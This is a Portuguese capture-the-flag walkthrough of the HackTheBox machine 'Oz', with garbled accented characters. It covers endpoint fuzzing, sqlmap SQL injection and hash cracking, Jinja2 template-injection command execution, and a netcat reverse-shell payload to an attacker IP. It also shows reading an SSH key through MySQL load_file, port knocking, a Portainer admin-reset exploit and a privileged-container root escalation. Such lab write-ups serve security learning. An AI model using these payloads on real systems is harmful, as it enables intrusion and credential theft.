# Oz - HackTheBox Writeup.

![Untitled](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled.png)

---

Ea√≠, hackers! De antem√£o, queria agradecer ao meu brother [kn1ghtmare](https://github.com/knightm4re) pelo fork no meu writeup passado, a partir de hoje todos os meus writeups seguir√£o a mesma l√≥gica de categorizar as etapas de realiza√ß√£o da m√°quina. Sem mais enrola√ß√£o, vamos l√°!

### Enumera√ß√£o de portas. üö™

```jsx
PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Werkzeug httpd 0.14.1 (Python 2.7.14)
8080/tcp open  http    syn-ack Werkzeug httpd 0.14.1 (Python 2.7.14)
```

O que me chama aten√ß√£o na enumera√ß√£o de portas √© que a m√°quina n√£o possui uma porta SSH, somente duas portas HTTP. De qualquer forma, vamos partir para a enumera√ß√£o das mesmas! üê∞

### Reconhecimento nas portas 80 e 8080. üñ•Ô∏è

![Untitled](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%201.png)

Na porta **80**, a p√°gina nos mostra uma mensagem de "Por favor, registre um usu√°rio". Podemos notar tamb√©m que o t√≠tulo da p√°gina nos chama aten√ß√£o: **OZ webapi**, ou seja, vamos come√ßar o API Fuzzing! 

Quando eu tentei enumerar os diret√≥rios, todos retornavam 200 OK como resposta. Quando eu tentei dar um cURL em um diret√≥rio que supostamente n√£o existe, veja o que acontece: 

![Untitled](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%202.png)

Como visto acima, ele retorna uma string aleat√≥ria quando a URL n√£o √© v√°lida, deixando toda requisi√ß√£o feita com status code 200.. Disgramaüíî. Ademais, eu pensei "se ele pede para registrarmos um usu√°rio, ent√£o provavelmente o diret√≥rio seja condizente com o mesmo, algo como 'register' ou 'user' deve funcionar". E foi isso que eu fiz, ao colocar "register" como diret√≥rio, ele retorna isso:

![Untitled](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%203.png)

Ao que me parece, quando a URL √© v√°lida, ele retorna com um "Please register a username!", que nem no diret√≥rio padr√£o. Com isso, eu elaborei um script em golang para filtrar todas as responses com o conte√∫do de "Please register a username!". Segue o c√≥digo (ele t√° bem ruim):

```go
package main
import (
	"os"
	"fmt"
	"bufio"
	"strings"
	"net/http"
	"io/ioutil"
)

func error(err interface{}) {
    if err != nil{
        panic(err)
    }
}

func scan(url string){
	fmt.Println(url)
	req, err := http.Get(url)
	error(err)

	body, err := ioutil.ReadAll(req.Body)
	error(err)
	resultado := string(body)
	verificar := strings.Contains(resultado, "Please register a username!")
	if verificar == true{
		fmt.Println(resultado)
	}
}

func main(){
	file, err := os.Open("big.txt") // especificar o path da wordlist
	 
	if err != nil {
		fmt.Println("falha ao ler arquivo, favor verificar o path.")
	}
 
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var txtlines []string
 
	for scanner.Scan() {
		txtlines = append(txtlines, scanner.Text())
	}
	 
	file.Close()
 
	for _, eachline := range txtlines {
		//fmt.Println(eachline)
		site := fmt.Sprintf("http://10.10.10.96/%s", eachline)
		scan(site)
	}
}
```

Feito isso, eu notei algo interessante quando ele chega no diret√≥rio "users", se liga:

![Untitled](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%204.png)

Entrando na URL, nos deparamos com a seguinte interface:

![Untitled](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%205.png)

Ao que me parece, o diret√≥rio √© v√°lido ü•≥! Quando eu fui colocar um diret√≥rio aleat√≥rio para ver se ele retornava uma string aleat√≥ria que nem antes, ele retornou um JSON. Ou seja, estamos interagindo agora com a API. Ao colocar uma aspas simples para ver o que acontecia, ele nos retornou um erro 500 no servidor:

### SQL Injection. üíâ

![Untitled](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%206.png)

Com isso, vamos ver se o mesmo √© vulner√°vel a SQL Injection! Rodamos o SQLMAP (n√£o tenho saco pra fazer na m√£o, perd√£o) e ele afirmou que √© um target vulner√°vel e aqui est√° o payload:

```sql
Parameter: #1* (URI)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://10.10.10.96:80/users/' AND (SELECT 4539 FROM (SELECT(SLEEP(5)))HnFr) AND 'oafg'='oafg

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: http://10.10.10.96:80/users/' UNION ALL SELECT CONCAT(0x716b6a6a71,0x4a5a75686a466179666c6479446b6a69414a5775566c656e4d587945655252776a6463746c517144,0x7171717871)-- -
```

Ap√≥s a enumera√ß√£o de databases, tabelas e colunas, consegui pegar usu√°rios e senhas (infelizmente criptografadas) na tabela "users_gwb". Aqui est√° o resultado:

```sql
# sqlmap --url="http://10.10.10.96/users/" -D ozdb -T users_gbw -C id,password,username --dump

Database: ozdb                                                                                                                     
Table: users_gbw
[6 entries]
+----+----------------------------------------------------------------------------------------+-------------+
| id | password                                                                               | username    |
+----+----------------------------------------------------------------------------------------+-------------+
| 1  | $pbkdf2-sha256$5000$aA3h3LvXOseYk3IupVQKgQ$ogPU/XoFb.nzdCGDulkW3AeDZPbK580zeTxJnG0EJ78 | dorthi      |
| 2  | $pbkdf2-sha256$5000$GgNACCFkDOE8B4AwZgzBuA$IXewCMHWhf7ktju5Sw.W.ZWMyHYAJ5mpvWialENXofk | tin.man     |
| 3  | $pbkdf2-sha256$5000$BCDkXKuVMgaAEMJ4z5mzdg$GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY | wizard.oz   |
| 4  | $pbkdf2-sha256$5000$bU2JsVYqpbT2PqcUQmjN.Q$hO7DfQLTL6Nq2MeKei39Jn0ddmqly3uBxO/tbBuw4DY | coward.lyon |
| 5  | $pbkdf2-sha256$5000$Zax17l1Lac25V6oVwnjPWQ$oTYQQVsuSz9kmFggpAWB0yrKsMdPjvfob9NfBq4Wtkg | toto        |
| 6  | $pbkdf2-sha256$5000$d47xHsP4P6eUUgoh5BzjfA$jWgyYmxDK.slJYUTsv9V9xZ3WWwcl9EBOsz.bARwGBQ | admin       |
+----+----------------------------------------------------------------------------------------+-------------+
```

Quebrando-as com john e utilizando a rockyou.txt como wordlist, n√≥s conseguimos quebrar a hash. Com isso, pegamos credenciais: wizard.oz:wizardofoz22

### Server Side Template Injection. üêò

Ap√≥s logarmos no servi√ßo rodando na porta 8080, nos deparamos com a seguinte interface de cria√ß√£o e monitoramento de tickets:

![Untitled](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%207.png)

Quando n√≥s escolhermos adicionar um ticket (no "+" no canto superior direito), esta √© a requisi√ß√£o que enviamos e recebemos:

![Untitled](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%208.png)

Como vimos na requisi√ß√£o acima, ao especificarmos o valor para o par√¢metro **name** e **desc**, ambos s√£o "refletidos" na response. N√≥s tamb√©m sabemos que eles utilizam um sistema de template, no caso **Jinja2**, para o desenvolvimento do web server (notamos isso na enumera√ß√£o do nmap, quando ele nos mostrou que estava sendo utilizando **python 2.7**). Tendo como base para payloads o site [SSTI - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python), eu escolhi um payload de multiplica√ß√£o para verificar se de fato √© vulner√°vel, e adivinha? Deu certo! üòè

![Untitled](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%209.png)

**Server Side Template Injection**, como o pr√≥prio nome diz, √© uma inje√ß√£o de c√≥digos utilizando o sistema de template que roda no site. Com isso, as templates aceitam tamb√©m execu√ß√£o de comandos shell (twig, erb, jinja2, etc..). Como n√≥s podemos injetar comandos de template, n√≥s podemos nos aproveitar disso e utilizar o sistema de template para a execu√ß√£o remota de comandos.

Utilizando o Payload All The Things como base, eu consegui achar um payload utilizando para **Jinja2** para execu√ß√£o de comandos. Aqui est√°:

> {{config.__class__.__init__.__globals__['os'].popen('ls -la').read()}}


Criptografando-o em URL Encode e injetando no par√¢metro vulner√°vel, recebemos a response com o output do comando! ü•≥

![Untitled](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2010.png)

### Reverse shell! üòà

Para pegarmos shell reversa no servidor, eu utilizei este payload que confere uma reverse shell com netcat e jinja2:

> {{config.__class__.__init__.__globals__['os'].popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.5 1234 >/tmp/f').read()}}


![Untitled](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2011.png)

![mp4.gif](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/mp4.gif)

---

### Pivota y pivota. ü§ß

Agora que j√° estamos dentro, √© quando a baderna vai come√ßar. Para nos contextualizarmos melhor na rede, eu subi o [nmap](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap) na m√°quina e enumerei todos os dispositivos conectados na rede. Com isso, eu obtive este resultado:

```jsx
Nmap scan report for ozdb.prodnet (10.100.10.4)
PORT     STATE SERVICE
3306/tcp open  mysql
MAC Address: 02:42:0A:64:0A:04 (Unknown)

Nmap scan report for webapi.prodnet (10.100.10.6)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:0A:64:0A:06 (Unknown)
)
Nmap scan report for tix-app (10.100.10.2)
PORT     STATE SERVICE
8080/tcp open  http-alt
```

Notamos que h√° tr√™s m√°quinas, onde duas hospedam portas **HTTP** e uma hospeda uma porta para o gerenciamento de banco de dados utilizando o servi√ßo **MySQL**. Com isso em mente, vamos enumerar agora a m√°quina em que estamos (lembrando que j√° estamos rootados).

Enumerando melhor a m√°quina, pude perceber que existe um diret√≥rio localizado na raiz do sistema (**/**) e que o mesmo possui arquivos confidenciais com senhas:

![Untitled](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2012.png)

Com isso, n√≥s pegamos credenciais de dois usu√°rios MySQL rodando no container **10.100.10.4**, uma do usu√°rio "dorthi" e outra do usu√°rio "root". Executando o comando abaixo, ele ir√° mostrar o resultado do "id_rsa" do usu√°rio dorthi:

```sql
mysql -h 10.100.10.4 -u "root" -p"SuP3rS3cr3tP@ss" -e "select load_file('/home/dorthi/.ssh/id_rsa');"
```

![Untitled](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2013.png)

Posteriormente, eu vi que a m√°quina n√£o possui a porta 22 aberta para a conex√£o remota. Vasculhando mais a mesma, eu pude encontrar um arquivo intrigante na pasta "**/.secrets**" intitulado de "**knockd.conf**". Abrindo ele, vemos isso:

![Untitled](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2014.png)

**Port Knocking !!** Utilizando a ferramenta [knock](https://github.com/grongor/knock), n√≥s conseguimos "acordar" as portas especificadas, e assim, abrir a porta 22, como exibida na imagem acima. Utilizando a senha "N0Pl4c3L1keH0me", n√≥s pegamos o usu√°rio. Vamos l√°:

![Untitled](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2015.png)

### Eleva√ß√£o de privil√©gio. üìà

Ao entrarmos na m√°quina via SSH, como vimos na imagem anterior, eu percebo que n√≥s temos privil√©gio de root para executar alguns comandos **docker**, veja:

![Untitled](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2016.png)

N√≥s temos permiss√£o para listar a network dos containers e para ver informa√ß√µes sobre as mesmas. Decidindo ver as informa√ß√µes da network **bridge**, n√≥s nos deparamos com algo interessante: est√° rodando um servi√ßo chamado "**portainer**", como √© poss√≠vel ver quando listamos as informa√ß√µes.

```json
"Containers": {
            "e267fc4f305575070b1166baf802877cb9d7c7c5d7711d14bfc2604993b77e14": {
                "Name": "portainer-1.11.1",
                "EndpointID": "fb5856e37c481199e5f80b14fe76c79b4cffd5a78bd40c87f613afd25995123c",
                "MacAddress": "02:42:ac:11:00:02",
                "IPv4Address": "172.17.0.2/16",
                "IPv6Address": ""
            }
```

Rodando um nmap no IP do container que est√° rodando esse servi√ßo, n√≥s vemos que a mesma est√° localizada na porta 9000. Veja:

```jsx
Discovered open port 9000/tcp on 172.17.0.2
Completed Connect Scan at 16:27, 0.00s elapsed (1 total ports)
Nmap scan report for 172.17.0.2
Host is up (0.00043s latency).
PORT     STATE SERVICE
9000/tcp open  unknown
```

```bash
ssh -L 9000:172.17.0.2:9000 -R 9000:172.17.0.2:9000 -i id_rsa dorthi@10.10.10.96
```

Realizando o port fowarding via SSH, n√≥s nos deparamos com a seguinte interface do portainer:

![Untitled](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2017.png)

Como vimos, n√≥s nos deparamos com uma tela de login. Testando por default credencials, como admin:admin, admin:password, guest:guest, nenhuma nos retorna algo üòî. Com isso, eu fui pesquisar se havia algum exploit p√∫blico para a vers√£o do portainer. Para quem n√£o se lembra, a vers√£o apareceu quando executamos o comando "**sudo /usr/bin/docker network inspect bridge**", se liga:

```json
"Name": "portainer-1.11.1",
```

Feito isso, eu consegui achar um suposto exploit de **reset admin credentials** para a exata vers√£o rodando no [GitHub](https://github.com/portainer/portainer/issues/493). Para realizarmos o exploit, n√≥s enviamos uma requisi√ß√£o **POST** para o diret√≥rio **/api/users/admin/init** com um JSON especificando o usu√°rio e a senha.

```json
{
	"Username":"admin",
	"Password":"admin"
}
```

Feito isso, n√≥s enviamos a requisi√ß√£o e a nova senha do admin ser√° setada para a que escolhemos! üëæ

![Untitled](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2018.png)

![Untitled](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2019.png)

Agora, para pegarmos a flag de root, n√≥s vamos criar um container com privil√©gios de root. Para fazer isso, eu criei um novo container com as seguintes configura√ß√µes:

![Untitled](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2020.png)

![Untitled](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2021.png)

O que eu fiz, de maneira simplificada, foi criar um novo container onde o diret√≥rio **/root** da m√°quina em que est√°vamos fosse movido para o diret√≥rio **/mnt** do nosso novo container. Para isso, eu escolhi uma imagem de container que j√° existia na rede, especifiquei o path que eu queria mover (no caso, **/root**) e o path para onde eu queria que fosse movido (**/mnt**). Feito isso, eu habilitei o modo **Privilege mode**, localizado na aba de **Security/Host** e criei a imagem do container (passo a passo nas duas prints acima).

Feito isso, eu acessei o console que me √© disponibilizado e:

![Untitled](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2022.png)

![Untitled](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2023.png)

E √© isso! Obrigado por terem lido at√© aqui! ü§†
